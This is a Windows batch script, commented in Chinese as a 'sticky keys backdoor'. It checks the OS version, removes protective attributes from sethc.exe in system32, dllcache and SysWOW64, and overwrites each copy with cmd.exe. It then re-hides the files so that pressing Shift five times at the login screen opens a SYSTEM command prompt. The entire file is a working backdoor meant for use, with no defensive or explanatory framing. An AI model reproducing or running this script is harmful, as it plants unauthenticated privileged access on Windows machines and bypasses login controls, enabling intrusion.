@echo off

rem 粘滞键后门

cls

ver | find "5.1." > NUL &&  goto win_xp    
ver | find "5.2." > NUL &&  goto win2003    
ver | find "6.0." > NUL &&  goto vista   
ver | find "6.1." > NUL &&  goto win7    
ver | find "6.2." > NUL &&  goto win8    

:win_xp 
echo "xp"


:win2003
attrib %systemroot%\system32\sethc.exe -h -r -s
attrib %systemroot%\system32\dllcache\sethc.exe -h -r -s

rem backup
copy  %systemroot%\system32\sethc.exe %systemroot%\system32\sethc1.exe 
copy  %systemroot%\system32\dllcache\sethc.exe %systemroot%\system32\sethc1.exe 

rem copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
rem copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe

rem 替换为后门
copy %systemroot%\system32\cmd.exe %systemroot%\system32\dllcache\sethc.exe /y
copy %systemroot%\system32\cmd.exe %systemroot%\system32\sethc.exe /y

attrib c:\windows\system32\sethc.exe +h +r +s
attrib c:\windows\system32\dllcache\sethc.exe +h +r +s


:win7
echo "win7"
attrib %systemroot%\system32\sethc.exe -h -r -s
attrib %systemroot%\SysWOW64\sethc.exe -h -r -s

rem backup
copy  %systemroot%\system32\sethc.exe %systemroot%\system32\sethc1.exe 
copy  %systemroot%\SysWOW64\sethc.exe %systemroot%\SysWOW64\sethc1.exe 

rem 替换为后门
copy %systemroot%\system32\cmd.exe %systemroot%\system32\sethc.exe /y
copy %systemroot%\SysWOW64\cmd.exe %systemroot%\SysWOW64\sethc.exe /y

attrib c:\windows\system32\sethc.exe +h +r +s
attrib c:\windows\SysWOW64\sethc.exe +h +r +s

pause


 

 

 

 

